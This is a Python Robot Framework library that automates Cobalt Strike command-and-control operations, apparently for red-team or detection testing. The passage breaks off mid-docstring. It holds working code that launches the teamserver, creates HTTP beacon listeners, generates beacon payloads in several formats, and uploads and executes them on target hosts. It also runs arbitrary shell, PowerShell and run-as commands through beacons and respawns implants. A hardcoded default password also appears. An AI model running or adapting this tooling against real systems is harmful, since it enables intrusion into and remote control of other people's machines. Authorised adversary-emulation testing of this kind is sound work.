# cobaltstrike.py (Robot Framework Library)

# noinspection PyInterpreter
import os
import random
import re
import shutil
import socket
import string
import subprocess
import sys
import time
from datetime import datetime
from enum import Enum
from pathlib import Path
from typing import Any, Dict, List, Optional

import pexpect.exceptions
from robot.api import logger

# Assuming C2Library, beacon, etc., are in the parent directory structure or PYTHONPATH
parent_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if parent_dir not in sys.path:
    sys.path.append(parent_dir)

try:
    import sudopass
    from C2Library import C2, CmdResult, Session
    #from beacon import Beacon
    #from sleep_python_bridge.striker import CSConnector, ArtifactType
    from payload_automation.beacon import Beacon
    from payload_automation.striker import ArtifactType, CSConnector

    #from listener import Listener
except ImportError as e:
    print(f"Error importing required libraries: {e}")
    print(
        "Please ensure C2Library, payload_automation, and sudopass are accessible in PYTHONPATH.")
    # Raising the error might be better for Robot Framework to catch during import
    raise ImportError(f"Missing required library dependencies: {e}")


################################################################
# Helper and Lambda functions
################################################################
def elevated(s):
    #  lambda s: True if "*" in s else False
    return True if "*" in s else False


def state(st):
    # lambda st: 1 if st == str('true') else 0
    return 1 if "true" in st else 0

def get_pid_by_process_name(log, process_name):
    """
    This function will get the pid of the first match
    process name out of the bps return log
    Args:
        log: output from bps logs
        process_name: name of process

    Returns:  return [pid, arch]

    """

    log_list = log[0].splitlines()
    ret = []
    for item in log_list:
        if process_name in item:
            item_list = item.split('\t')
            if len(item_list) > 3:
                pid, arch = item_list[2], item_list[3]
                ret.extend([pid, arch])
                break
            else:
                pid = item_list[2]
                ret.append(pid)
                break

    if not ret:
        print(f"{process_name} is not in the return log.")

    return ret

def copy_file_from_download(destination, download_file ):
    """
    Copy file from cobaltstrike download folder to user's specified locaton
    Args:
        destination: user's specified location
        download_file: file in download folder

    Returns: True if success

    """

    ret = False

    try:
        shutil.copy(download_file, destination)
        ret = True
    except FileNotFoundError:
        print(f"Error: Source file '{download_file}' not found.")
    except Exception as err:
        print(f"An error occurred: {err}")

    return ret

########################################################################
# Listener Enum
########################################################################

class Listener(Enum):
    Beacon_DNS = "windows/beacon_dns/reverse_dns_txt"
    Beacon_HTTP = "windows/beacon_http/reverse_http"
    Beacon_HTTPS = "windows/beacon_https/reverse_https"
    Beacon_SMB = "windows/beacon_bind_pipe"
    Beacon_TCP = "windows/beacon_bind_tcp"
    External_C2 = "windows/beacon_extc2"
    Foreign_HTTP = "windows/foreign/reverse_http"
    Foreign_HTTPS = "windows/foreign/reverse_https"

#########################################################################


class cobaltstrike(C2):
    # --- CobaltStrikeC2 Class Implementation ---

    TEAMSERVER_HOST: Optional[str] = None
    LOCAL_BIND_IP: str = ""
    PORT: int = 50050
    USER: str = "default_user"
    CS_PASSWORD: str = ""
    CS_DIR: str = ""
    DEBUG: bool = False
    default_payload_path: Optional[Path] = None
    num_attempts: int = 0
    TEAMSERVER_PROCESS = None  # Added to store process

    ROBOT_LIBRARY_SCOPE = 'GLOBAL'

    def __init__(self, local_bind_ip: str = "", user: str = "default_user",
                 cs_password: str = "", cs_dir: str = "", port: int = 50050,
                 debug: bool = False):
        super().__init__()
        self.LOCAL_BIND_IP = local_bind_ip
        self.USER = user
        self.CS_PASSWORD = cs_password
        self.CS_DIR = cs_dir
        self.PORT = port
        self.DEBUG = debug
        self.TEAMSERVER_PROCESS = None
        # Resolve CS_DIR to absolute path early
        if self.CS_DIR:
            self.CS_DIR = str(Path(self.CS_DIR).resolve())
        self.TEAMSERVER_HOST = self.LOCAL_BIND_IP if self.LOCAL_BIND_IP else None

    def proof_of_abstraction(self):
        print("Cobalt Strike C2 Implementation Proof")

    def debug_print(self, string: str):
        if self.DEBUG:
            print(f"[DEBUG] {string}")

    def find_cs_path(self):
        # Use resolved path if already set
        if self.CS_DIR and os.path.isdir(self.CS_DIR):
            self.debug_print(f"Using provided CS_DIR: {self.CS_DIR}")
            return True
        # Try default CS path
        default_path = Path("/opt/cobaltstrike").resolve()
        if default_path.is_dir():
            self.CS_DIR = str(default_path)
            self.debug_print(f"Found default CS path: {self.CS_DIR}")
            return True
        else:
            # Use original provided path in error if default fails
            orig_path = self.CS_DIR if self.CS_DIR else '<Not Set>'
            print(f"Error: Cobalt Strike directory not found at '{default_path}' or specified path '{orig_path}'.")
            raise FileNotFoundError("Cobalt Strike directory not found.")

    def find_local_ip(self):
        if self.LOCAL_BIND_IP:
            self.debug_print(f"Using provided LOCAL_BIND_IP: {self.LOCAL_BIND_IP}")
            if not self.TEAMSERVER_HOST: self.TEAMSERVER_HOST = self.LOCAL_BIND_IP
            return True
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(1)
            s.connect(("1.1.1.1", 80))  # Use reliable external IP
            self.LOCAL_BIND_IP = s.getsockname()[0]
            s.close()
            self.debug_print(f"Automatically detected local IP: {self.LOCAL_BIND_IP}")
            if not self.TEAMSERVER_HOST: self.TEAMSERVER_HOST = self.LOCAL_BIND_IP
            return True
        except socket.error as e:
            print(f"Error: Cannot automatically determine local IP address: {e}")
            raise ConnectionError("Failed to find local IP")

    def _configure_and_validate(self):
        # Ensure CS_DIR is set and resolved first
        if not self.CS_DIR:
            self.find_cs_path()
        elif not Path(self.CS_DIR).is_absolute():  # Resolve if relative path given
            self.CS_DIR = str(Path(self.CS_DIR).resolve())

        teamserver_path = os.path.join(self.CS_DIR, "server", "teamserver")
        if not os.path.exists(teamserver_path) or not os.path.isfile(teamserver_path):
            raise FileNotFoundError(f"Teamserver executable not found at {teamserver_path}")

        if not self.LOCAL_BIND_IP: self.find_local_ip()
        if not self.TEAMSERVER_HOST: self.TEAMSERVER_HOST = self.LOCAL_BIND_IP

        if not self.CS_PASSWORD:
            print("Warning: No CS_PASSWORD provided, using default 'P@ssw0rd'. THIS IS INSECURE.")
            self.CS_PASSWORD = "P@ssw0rd"
        if not self.USER:
            print("Warning: No USER provided, using default 'default_user'.")
            self.USER = "default_user"

        # Ensure CS_DIR exists and is a directory AFTER potential finding/resolving
        if not Path(self.CS_DIR).is_dir():
            raise FileNotFoundError(f"Cobalt Strike directory '{self.CS_DIR}' does not exist or is not a directory.")

        self.debug_print(f"Configuration:")
        self.debug_print(f"  CS_DIR: {self.CS_DIR}")
        self.debug_print(f"  LOCAL_BIND_IP: {self.LOCAL_BIND_IP}")
        self.debug_print(f"  TEAMSERVER_HOST: {self.TEAMSERVER_HOST}")
        self.debug_print(f"  PORT: {self.PORT}")
        self.debug_print(f"  USER: {self.USER}")
        self.debug_print(f"  CS_PASSWORD: {'*' * len(self.CS_PASSWORD)}")

    def _get_beacon_for_session(self, session: Session) -> Optional[Beacon]:

        if session.beacon_id is None:
            print("Error: Session has no beacon_id."); return None
        try:
            # Pass CS_DIR to Beacon constructor
            return Beacon(
                id=str(session.beacon_id),
                teamserver=self.TEAMSERVER_HOST,
                user=self.USER,
                password=self.CS_PASSWORD,
                cobaltstrike_directory=self.CS_DIR  # Pass CS directory
            )
        except Exception as e:
            print(f"Error initializing Beacon for ID {session.beacon_id}: {type(e).__name__}: {e}")
            return None

    # TODO: implement to get domain
    def _get_domain(self, session_id: str) -> str:
        pass

    def _get_session_info(self, raw_info: dict) -> Session:

        session = Session()

        session.ip = raw_info['host'].strip()
        session.beacon_id = raw_info['id'].strip()
        session.username = raw_info['user'].strip("*")
        session.domain = self._get_domain(raw_info['id'].strip())
        session.elevated = elevated(raw_info['user'].strip())
        session.state = session.session_state[state(str(raw_info['alive']))]
        sleep = raw_info['sleep']
        session.sleep = sleep[0]
        session.jitter = sleep[1]

        return session

    def start_C2(self) -> bool:
        try:
            self._configure_and_validate()
        except (FileNotFoundError, ConnectionError) as e:
            print(f"Config error: {e}")
            return False
        # --- Port Check / Kill ---
        try:
            check_port_cmd = ['sudo', 'lsof', '-t', f'-i:{self.PORT}']
            self.debug_print(f"Running command: {' '.join(check_port_cmd)}")
            pid_bytes = subprocess.check_output(check_port_cmd, text=False, stderr=subprocess.PIPE)
            pid = pid_bytes.decode('utf-8').strip()
            if pid:
                print(f"Port {self.PORT} used by PID {pid}. Killing.")
                subprocess.run(['sudo', 'lsof', f'-i:{self.PORT}'], text=True, check=False)
                kill_cmd = ['sudo', 'kill', pid]
                self.debug_print(f"Running command: {' '.join(kill_cmd)}")
                subprocess.run(kill_cmd, check=True, capture_output=True)
                print(f"Sent kill signal to PID {pid}. Waiting...");
                time.sleep(3)
        except subprocess.CalledProcessError as e:
            if e.returncode == 1 and not e.stderr:
                self.debug_print(f"Port {self.PORT} is free.")
            else:
                print(f"Warning checking/killing process on port {self.PORT}: {e}")
        except Exception as e:
            print(f"Unexpected error during port check/kill: {e}")
            return False

        # --- Start Team Server ---
        teamserver_executable = os.path.join(self.CS_DIR, "server", "teamserver")
        # Pass the resolved, absolute CS_DIR as cwd
        current_working_dir = os.path.join(self.CS_DIR, "server")
        args = ["sudo", teamserver_executable, self.LOCAL_BIND_IP, self.CS_PASSWORD]
        print(f"Starting Team Server in '{current_working_dir}': {' '.join(args[:-1])} ****")
        try:
            # Use absolute path for executable within sudo if needed, though cwd should handle it
            proc = subprocess.Popen(args, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True,
                                    cwd=current_working_dir, stdin=None)
            self.TEAMSERVER_PROCESS = proc
            print("Team Server process initiated. Waiting for startup (up to 30s)...");
            time.sleep(15)
            # --- Verify Connection ---
            max_attempts = 3
            for attempt in range(max_attempts):
                try:
                    # Pass CS_DIR to CSConnector
                    with CSConnector(cs_host=self.TEAMSERVER_HOST, cs_user=f"{self.USER}_startup_{attempt}",
                                     cs_pass=self.CS_PASSWORD, cs_directory=self.CS_DIR, cs_port=self.PORT) as cs:
                        cs.ag_sendline('elog("Python client connected for startup check.")')
                        print("Team Server connection verified.")
                        return True
                except Exception as connect_e:
                    print(f"Attempt {attempt + 1}/{max_attempts} connect failed: {type(connect_e).__name__}: {connect_e}")  # Log exception type
                    if attempt < max_attempts - 1:
                        if self.TEAMSERVER_PROCESS.poll() is not None:
                            print("Team Server terminated prematurely.")
                            return False
                        print("Retrying connection...")
                        time.sleep(10)
                    else:
                        print("Max connection attempts reached.")
                        return False
        except FileNotFoundError:
            print(f"Error executing '{teamserver_executable}'. Check path and sudo permissions.")
            self.TEAMSERVER_PROCESS = None
            return False
        except Exception as e:
            print(f"Error starting Team Server: {type(e).__name__}: {e}")
            self.TEAMSERVER_PROCESS = None
            return False
        return False  # Should have returned true if connection verified

    def stop_C2(self) -> bool:
        print("Stopping Team Server...")
        if self.TEAMSERVER_PROCESS and self.TEAMSERVER_PROCESS.poll() is None:
            try:
                print(f"Sending SIGTERM (PID: {self.TEAMSERVER_PROCESS.pid})...")
                self.TEAMSERVER_PROCESS.terminate()
                try:
                    stdout, stderr = self.TEAMSERVER_PROCESS.wait(timeout=15)
                    print("Terminated gracefully.")
                except subprocess.TimeoutExpired:
                    print("Did not terminate gracefully, sending SIGKILL.")
                    self.TEAMSERVER_PROCESS.kill()
                    time.sleep(2)
                    stdout, stderr = self.TEAMSERVER_PROCESS.communicate()  # Get remaining
                self.debug_print(f"Final stdout:\n{stdout}")
                self.debug_print(f"Final stderr:\n{stderr}")
                self.TEAMSERVER_PROCESS = None
                return True
            except Exception as e:
                print(f"Error during termination: {e}")
                self.TEAMSERVER_PROCESS = None
                return False
        elif self.TEAMSERVER_PROCESS and self.TEAMSERVER_PROCESS.poll() is not None:
            print("Already terminated.")
            self.TEAMSERVER_PROCESS = None
            return True
        else:
            print("No active process found.")
            return True

    def get_sessions(self) -> list[Session]:
        """
        Get list of active sessions
        :return: list of session objects
        """

        ret_list = []
        c2 = cobaltstrike()
        c2._configure_and_validate()

        print("WAIT: Attempting to get initial beacon list...")
        with CSConnector(cs_host=c2.TEAMSERVER_HOST, cs_user=f"{c2.USER}_wait_initial", cs_pass=c2.CS_PASSWORD,
                         cs_port=c2.PORT, cs_directory=c2.CS_DIR) as cs:
            # get_beacons returns JavaList, iterate through it
            raw_initial_beacons = cs.get_beacons()  # This is the JavaList
            if raw_initial_beacons:  # Check if it's not None or empty
                for beacon_info in raw_initial_beacons:
                    # Access 'id' key, assuming each item behaves like a dict
                    session = self._get_session_info(beacon_info)
                    ret_list.append(session)

        return ret_list

    def get_sessions_by_ip(self, ip) -> list[Session]:
        """
        Get a list of active sessions that are linked to the provided ip
        :param ip:
        :return: list of session objects
        """
        ret_val = []

        sessions = self.get_sessions()

        for session in sessions:

            if session.ip == ip and session.state == "active":
                ret_val.append(session)

        return ret_val

    def get_sessions_by_user(self, username: str) -> list[Session]:
        """
        Get list of active sessions by user
        :param username:
        :return: list of active session objects
        """
        ret_val = []

        sessions = self.get_sessions()

        for session in sessions:
            if session.username.strip() == username.strip() and session.state == "active":
                ret_val.append(session)

        return ret_val

    def get_session_by_id(self, beacon_id) -> Session:
        """
        Get an active session with specified beacon_id
        :param beacon_id: id of the beacon
        :return: session object with the specified beacon_id
        """
        ret_val = Session()

        sessions = self.get_sessions()

        for session in sessions:
            if session.beacon_id == beacon_id and session.state == "active":
                ret_val = session
                break

        return ret_val

    def session_sleep(self, session, sleep_time: int, jitter: int) -> bool:
        """
        Put a session to sleep for a given duration in seconds with jitter
        :param session:  The session to sleep
        :param sleep_time: duration in seconds
        :param jitter: int between 0 and 100 to use for the session's sleep jitter
        :return: bool of the result success status
        """
        result = False

        beacon = self._get_beacon_for_session(session)
        if not beacon:
            error_msg = "Failed to get Beacon object for session."
            print(f"[!] Error: {error_msg}")
            return result

        print(f"Issuing sleep command to Beacon {session.beacon_id}: Sleep time {sleep_time} seconds, with {jitter}% jitter")
        aggressor_cmd = f"bsleep({session.beacon_id}, {sleep_time}, {jitter});"
        print(f"[*] Aggressor Cmd: {aggressor_cmd}")

        task_result = beacon.bsleep(sleep_time, jitter)
        result = task_result.success

        return result

    def kill_session(self, session) -> bool:

        result = False

        beacon = self._get_beacon_for_session(session)
        if not beacon:
            error_msg = "Failed to get Beacon object for session."
            print(f"[!] Error: {error_msg}")
            return result

        print(f"Issuing exit command to Beacon {session.beacon_id}")
        aggressor_cmd = f"bexit({session.beacon_id});"
        print(f"[*] Aggressor Cmd: {aggressor_cmd}")

        task_result = beacon.bexit()
        result = task_result.success

        return result

    def remove_beacon(self, session: Session) -> bool:
        """Remove a beacon entry from the Cobalt Strike UI / teamserver data model.

        Does NOT kill the beacon process on the target — only purges the stale
        record from the teamserver.  Call kill_session() first if the beacon is
        still alive.

        :param session: Session whose beacon entry should be removed.
        :return: True if the remove command was sent successfully.
        """
        if not session or not session.beacon_id:
            print("[!] remove_beacon: invalid session or missing beacon_id.")
            return False

        return self.remove_beacon_by_id(session.beacon_id)

    def remove_beacon_by_id(self, beacon_id: str) -> bool:
        """Remove a beacon entry from the Cobalt Strike UI by raw beacon ID string.

        Uses the Aggressor beacon_remove() function — equivalent to right-click
        → 'Remove' in the CS client.

        :param beacon_id: The string beacon ID to remove.
        :return: True if the aggressor command was dispatched without error.
        """
        if not beacon_id:
            print("[!] remove_beacon_by_id: no beacon_id provided.")
            return False

        try:
            self._configure_and_validate()
        except (FileNotFoundError, ConnectionError) as e:
            print(f"[!] Config error in remove_beacon_by_id: {e}")
            return False

        aggressor_cmd = f"beacon_remove({beacon_id});"
        print(f"[*] Removing beacon entry {beacon_id} from teamserver")
        print(f"[*] Aggressor Cmd: {aggressor_cmd}")

        try:
            with CSConnector(
                cs_host=self.TEAMSERVER_HOST,
                cs_user=f"{self.USER}_remove_beacon",
                cs_pass=self.CS_PASSWORD,
                cs_directory=self.CS_DIR,
                cs_port=self.PORT,
            ) as cs:
                cs.ag_sendline(aggressor_cmd, sleep_time=2)
                print(f"[+] beacon_remove command sent for {beacon_id}.")
                return True
        except Exception as e:
            print(f"[!] remove_beacon_by_id exception: {type(e).__name__}: {e}")
            return False

    def kill_session_by_id(self, beacon_id: str) -> bool:
        """Exit a beacon by beacon ID string without needing a full Session object.

        Constructs a minimal Session and calls kill_session().  Useful when you
        only have the beacon ID from a prior get_sessions() or get_beacons() call.

        :param beacon_id: String beacon ID to kill.
        :return: True if bexit() was tasked successfully.
        """
        if not beacon_id:
            print("[!] kill_session_by_id: no beacon_id provided.")
            return False

        minimal_session = Session(beacon_id=str(beacon_id))
        result = self.kill_session(minimal_session)

        if result:
            print(f"[+] kill_session_by_id: bexit tasked for beacon {beacon_id}.")
        else:
            print(f"[!] kill_session_by_id: bexit failed for beacon {beacon_id}.")

        return result

    def kill_all_sessions(self, remove_after_kill: bool = False) -> dict:
        """Exit every active beacon currently on the teamserver.

        Iterates get_sessions(), calls kill_session() on each active one, and
        optionally calls remove_beacon_by_id() afterward to clear the entries
        from the CS UI.

        :param remove_after_kill: If True, also removes each beacon entry from
                                  the teamserver UI after sending bexit.
                                  Defaults to False — beacon may not have
                                  processed exit before remove fires.
        :return: dict mapping beacon_id -> bool (True = bexit tasked successfully).
        """
        results: dict = {}

        sessions = self.get_sessions()
        if not sessions:
            print("[*] kill_all_sessions: no active sessions found.")
            return results

        active = [s for s in sessions if s.state == "active"]
        print(f"[*] kill_all_sessions: {len(active)} active session(s) found.")

        for session in active:
            bid = session.beacon_id
            print(f"[*] Killing beacon {bid} ({session.ip} / {session.username})")
            success = self.kill_session(session)
            results[bid] = success

            if remove_after_kill:
                time.sleep(3)
                self.remove_beacon_by_id(bid)

        killed = sum(1 for v in results.values() if v)
        print(f"[+] kill_all_sessions: {killed}/{len(active)} bexit commands tasked.")
        return results

    def respawn_session(
        self,
        session: Session,
        listener_name: str,
        payload_template: str = "exe",
        payload_output_dir: str = "/tmp/lumen_respawn",
        payload_name: str = "beacon_respawn",
        exec_path_on_target: str = r"C:\Windows\Temp\beacon_respawn.exe",
        remove_old_entry: bool = True,
    ) -> bool:
        """Kill an existing beacon, generate a fresh payload, upload and execute it.

        Workflow:
            1. Generates a new payload via create_payload().
            2. Uploads it to the target via upload_file() while beacon is still alive.
            3. Issues bexit via kill_session() to terminate the old implant.
            4. Issues a shell command to execute the uploaded payload.
            5. Optionally removes the stale beacon entry from the CS UI.

        Upload-before-kill ordering ensures the target has the payload ready
        before the existing implant tears itself down.  CS queues both the
        shell exec and bexit commands — the exec fires first on the next check-in.

        :param session:             Active session to respawn.
        :param listener_name:       CS listener the new beacon should call back to.
        :param payload_template:    Payload type ('exe', 'dll', 'ps1', etc.). Default 'exe'.
        :param payload_output_dir:  Local dir to write the generated payload. Default '/tmp/lumen_respawn'.
        :param payload_name:        Base filename (no extension). Default 'beacon_respawn'.
        :param exec_path_on_target: Where the payload lands and runs on the target.
        :param remove_old_entry:    Remove the old beacon entry from CS UI after kill. Default True.
        :return: True if upload and execute commands were dispatched without error.
                 Does NOT confirm new beacon check-in — use wait_for_beacon helpers for that.
        """
        if not session or not session.beacon_id:
            print("[!] respawn_session: invalid session.")
            return False

        bid = session.beacon_id
        print(f"[*] respawn_session: starting respawn for beacon {bid}")

        # Step 1: Generate fresh payload
        print(f"[*] respawn_session: generating {payload_template} payload for listener '{listener_name}'")
        local_payload_path = self.create_payload(
            name=payload_name,
            payload_template=payload_template,
            listener_name=listener_name,
            out_file=payload_output_dir,
            _retries=3,
            x64=True,
        )

        if not local_payload_path:
            print(f"[!] respawn_session: payload generation failed. Aborting.")
            return False

        print(f"[+] respawn_session: payload written to {local_payload_path}")

        # Step 2: Upload payload to target while beacon is still alive
        print(f"[*] respawn_session: uploading payload to {exec_path_on_target}")
        upload_ok = self.upload_file(session, local_payload_path, exec_path_on_target)
        if not upload_ok:
            print(f"[!] respawn_session: upload failed. Aborting to avoid stranding target.")
            return False

        print(f"[+] respawn_session: upload succeeded.")

        # Step 3: Kill the existing beacon
        print(f"[*] respawn_session: issuing bexit to beacon {bid}")
        kill_ok = self.kill_session(session)
        if not kill_ok:
            print(f"[!] respawn_session: bexit tasking failed for {bid}. "
                  f"Payload is uploaded but old beacon may still be alive.")

        # Step 4: Execute the uploaded payload — queued before bexit is processed
        print(f"[*] respawn_session: executing payload at {exec_path_on_target}")
        exec_result = self.issue_shell_cmd(session, exec_path_on_target)
        if not exec_result.success:
            print(f"[!] respawn_session: shell exec failed: {exec_result.result}")
            return False

        print(f"[+] respawn_session: execution command dispatched. Waiting for new beacon callback.")

        # Step 5: Optionally remove old beacon entry
        if remove_old_entry:
            time.sleep(5)
            self.remove_beacon_by_id(bid)
            print(f"[*] respawn_session: old beacon entry {bid} removed from CS UI.")

        return True

    def create_payload(
            self,
            name: str,
            payload_template: str,
            listener_name: str,
            out_file: str,
            _retries: int,
            x64: bool = True
    ) -> str:
        """
        Create a payload on the C2 with any parameters and outputs it to the CWD.
        :param name: name of the payload
        :param payload_template: the type of payload to create (exe, dll, svc.exe, bin, ps1, py, vbs)
        :param listener_name: listener to call back to from payload
        :param out_file: path of the output file (only the directory)
        :param _retries: this parameter will be ignored in  the implementation
        :param x64: Optional. Generate a x64 or x86 payload. Defaults to True.
        :return: Str containing full path of the new payload
        """

        try:
            self._configure_and_validate()
        except (FileNotFoundError, ConnectionError) as e:
            print(f"Config error: {e}")
            return ""

        payload_types_map = {'dll': ArtifactType.DLL, 'exe': ArtifactType.EXE, 'svc.exe': ArtifactType.SVCEXE,
                             'bin': ArtifactType.RAW, 'ps1': ArtifactType.POWERSHELL, 'py': ArtifactType.PYTHON,
                             'vbs': ArtifactType.VBSCRIPT}

        file_extensions_map = {'dll': '.dll', 'exe': '.exe', 'svc.exe': '.exe', 'bin': '.bin', 'ps1': '.ps1',
                               'py': '.py', 'vbs': '.vbs'}

        if payload_template not in payload_types_map:
            print(f"Error: No valid payload types in '{payload_template}'. Valid: {list(payload_types_map.keys())}")
            return ""

        try:
            # Pass CS_DIR to CSConnector
            with CSConnector(cs_host=self.TEAMSERVER_HOST, cs_port=self.PORT, cs_user=f"{self.USER}_create_pay",
                             cs_pass=self.CS_PASSWORD, cs_directory=self.CS_DIR) as cs:
                listeners = cs.get_listeners_stageless()
                if not listeners:
                    print("Warning: No listeners found.")
                    return ""

                for listener in listeners:
                    if listener.lower() == 'local':
                        continue
                    if listener_name.lower() != 'all' and listener.lower() != listener_name.lower():
                        continue

                    print(f"[*] Creating payloads for listener: {listener}")
                    try:
                        artifact_type = payload_types_map[payload_template]
                        extension_type = file_extensions_map[payload_template]
                        is_staged = False
                        payload_bytes = cs.generatePayload(listener, artifact_type, is_staged, x64)
                        if payload_bytes:
                            if not isinstance(out_file, Path):
                                payload_path = Path(out_file)
                                payload_path.mkdir(parents=True, exist_ok=True)
                                filename = payload_path / f"{name}{extension_type}"
                                print(f"filename: {filename}")
                                try:
                                    with open(filename, 'wb') as file:
                                        file.write(payload_bytes)
                                        print(f"[*] Payload written to: {filename.resolve()}")
                                        return str(filename.resolve())
                                except IOError as e:
                                    print(f"Error writing payload {filename}: {e}")
                                    return ""
                        else:
                            print(f"[!]   Failed to generate bytes for {name}.")
                    except Exception as gen_e:
                        print(f"[!]   Error generating {name}: {gen_e}")

        except Exception as e:
            print(f"Error connecting during payload creation: {e}")

    def create_listener(self, name: str, port: int, listener_type="Beacon_HTTP", ip="0.0.0.0", host_url=None):
        """
        Create a reverse_http listener
        :param name: name of the listener
        :param port: port number
        :param listener_type: type of listener.  Available options are in class Listener.  Default is "Beacon_HTTP"
        :param ip:  c2 host ip
        :param host_url:
        :return:
        """

        try:
            self._configure_and_validate()
        except (FileNotFoundError, ConnectionError) as e:
            print(f"Config error: {e}")
            return False

        options = {
            "host": f'"{ip}"',
            "port": port,
            "beacons": f'"{ip}"'
        }

        if listener_type == "Beacon_HTTP" or listener_type == "Beacon_HTTPS":
            listener = Listener[listener_type].value
        else:
            print(f"Unsupported listener type")
            return False

        if options:
            opts_formatted = []
            for key, value in options.items():
                opts_formatted.append(f'{key} => {value}')
            listener_args_str = "%(" + ", ".join(opts_formatted) + ")"
            aggressor_cmd = f'listener_create_ext("{name}", "{listener}", {listener_args_str});'
        else:
            aggressor_cmd = f'listener_create_ext("{name}", "{listener}");'
            self.debug_print(f"Aggressor command: {aggressor_cmd}")

        max_retries = 5
        self.num_attempts = 0
        listener_created_successfully = False
        for attempt in range(max_retries):
            self.num_attempts += 1
            try:
                # Pass CS_DIR to CSConnector
                with CSConnector(cs_host=self.TEAMSERVER_HOST, cs_user=f"{self.USER}_create_lst_{attempt}",
                                 cs_pass=self.CS_PASSWORD, cs_directory=self.CS_DIR, cs_port=self.PORT) as cs:
                    cs.ag_sendline(f'elog("Attempting create listener: {name} (Attempt {self.num_attempts})")')
                    cs.ag_sendline(aggressor_cmd, sleep_time=3)
                    time.sleep(3)
                    listeners = cs.get_listeners_stageless()
                    if name in listeners:
                        print(f"Listener '{name}' verified in CS.")
                        listener_created_successfully = True
                    else:
                        print(f"Listener '{name}' not found after attempt {self.num_attempts}.")

                    if listener_created_successfully:
                        return listener_created_successfully

            except Exception as connect_e:
                print(f"Error connecting/communicating attempt {self.num_attempts}: {connect_e}")

            if not listener_created_successfully and attempt < max_retries - 1:
                print("Retrying listener creation...")
                time.sleep(10)

        print(f"Failed to create listener '{name}'.")
        return listener_created_successfully

    def remove_listener(self, name: str) -> bool:
        """
        Remove a listener from Teamserver
        :param name: name of the listener
        :return:
        """

        if not name:
            print("Listener name required.")
            return False

        try:
            self._configure_and_validate()
        except (FileNotFoundError, ConnectionError) as e:
            print(f"Config error: {e}")
            return False

        listener_deleted_from_cs = False
        try:
            # Pass CS_DIR to CSConnector
            with CSConnector(cs_host=self.TEAMSERVER_HOST, cs_user=f"{self.USER}_delete_lst", cs_pass=self.CS_PASSWORD,
                             cs_directory=self.CS_DIR, cs_port=self.PORT) as cs:
                listeners_before = cs.get_listeners_stageless()
                if name not in listeners_before:
                    print(f"Warning: Listener '{name}' not in CS.")
                    listener_deleted_from_cs = True
                else:
                    aggressor_cmd = f'listener_delete("{name}");'
                    cs.ag_sendline(f'elog("Attempting delete listener: {name}")')
                    cs.ag_sendline(aggressor_cmd, sleep_time=2)
                    time.sleep(3)
                    listeners_after = cs.get_listeners_stageless()
                    if name not in listeners_after:
                        print(f"Listener '{name}' verified deleted from CS.")
                        listener_deleted_from_cs = True
                    else:
                        print(f"Error: Listener '{name}' still exists in CS.")
                        listener_deleted_from_cs = False
        except Exception as e:
            print(f"Error communicating during listener deletion: {e}")
            listener_deleted_from_cs = False

        return listener_deleted_from_cs

    def issue_shell_cmd(self, session: Session, cmd: str) -> CmdResult:
        """
        Run an arbitrary cmd command on the specified session
        :param session: session to run the command on
        :param cmd: arbitrary string to run as a cmd command on the target session
        :return: CmdResult containing output of the command, if there is any
        """

        result = CmdResult()

        beacon = self._get_beacon_for_session(session)
        if not beacon:
            error_msg = "Failed to get Beacon object for session."
            print(f"[!] Error: {error_msg}")
            return result

        print(f"Issuing shell command to Beacon {session.beacon_id}")
        aggressor_cmd = f"bshell({session.beacon_id}, '{cmd}')"
        print(f"[*] Aggressor Cmd: {aggressor_cmd}")

        try:
            task_result = beacon.bshell(cmd)
            result.success = task_result.success
            result.result = task_result.output
        except pexpect.exceptions.TIMEOUT as err:
            print(f"[*]Exception with TimeoutError: {err}")
            pass
        except Exception as e:
            print(f"[*]Exception type {type(e)}, name {type(e).__name__}")
            pass

        return result

    def issue_powershell_cmd(self, session: Session, cmd: str) -> CmdResult:
        """
        Run an arbitrary PowerShell command on the specified session
        :param session: session to run the command on
        :param cmd: arbitrary string to run as a PowerShell command on the target session
        :return: CmdResult including the output of the command if there was any
        """

        result = CmdResult()

        beacon = self._get_beacon_for_session(session)
        if not beacon:
            error_msg = "Failed to get Beacon object for session."
            print(f"[!] Error: {error_msg}")
            return result

        print(f"Issuing Powershell command to Beacon {session.beacon_id}")
        aggressor_cmd = f"bpowershell({session.beacon_id}, '{cmd}')"
        print(f"[*] Aggressor Cmd: {aggressor_cmd}")

        try:
            task_result = beacon.bpowershell(cmd)
            result.success = task_result.success
            result.result = task_result.output
        except pexpect.exceptions.TIMEOUT as err:
            print(f"[*]Exception with TimeoutError: {err}")
            pass
        except Exception as e:
            print(f"[*]Exception type {type(e)}, name {type(e).__name__}")
            pass

        return result

    def issue_c2_cmd(self, session: Session, cmd: str) -> CmdResult:
        pass

    def runas(self, session: Session, username: str, password: str, domain: str, cmd: str) -> CmdResult:

        result = CmdResult()

        beacon = self._get_beacon_for_session(session)
        if not beacon:
            error_msg = "Failed to get Beacon object for session."
            print(f"[!] Error: {error_msg}")
            return result

        print(f"Issuing brunas command to Beacon {session.beacon_id}")
        aggressor_cmd = f"brunas({session.beacon_id}, '{domain}', '{username}', '{password}', '{cmd}')"
        print(f"[*] Aggressor Cmd: {aggressor_cmd}")

        try:
            task_result = beacon.brunas(username, password, domain, cmd)
            result.success = task_result.success
            result.result = task_result.output
        except pexpect.exceptions.TIMEOUT as err:
            print(f"[*]Exception with TimeoutError: {err}")
            pass
        except Exception as e:
            print(f"[*]Exception type {type(e)}, name {type(e).__name__}")
            pass

        return result

    def upload_file(self, session: Session, local_path: str, target_path: str) -> bool:
        """
        Upload a file from c2 to target system
        :param session: target session
        :param local_path: path of file to upload
        :param target_path: path of file on target system
        :return:
        """
        result = False

        beacon = self._get_beacon_for_session(session)
        if not beacon:
            error_msg = "Failed to get Beacon object for session."
            print(f"[!] Error: {error_msg}")
            return result

        print(f"Issuing bupload command to Beacon {session.beacon_id}")
        aggressor_cmd = f"bupload({session.beacon_id}, {local_path})"
        print(f"[*] Aggressor Cmd: {aggressor_cmd}")

        try:
            task_result = beacon.bupload(local_path, target_path)
            result= task_result.success
        except pexpect.exceptions.TIMEOUT as err:
            print(f"[*]Exception with TimeoutError: {err}")
            pass
        except Exception as e:
            print(f"[*]Exception type {type(e)}, name {type(e).__name__}")
            pass

        return result

    def download_file(self, session: Session, target_path: str, local_path="") -> bool:
        """
        Download file from target system to cobaltstrike teamserver Downloads folder.
        :param session: session of target system
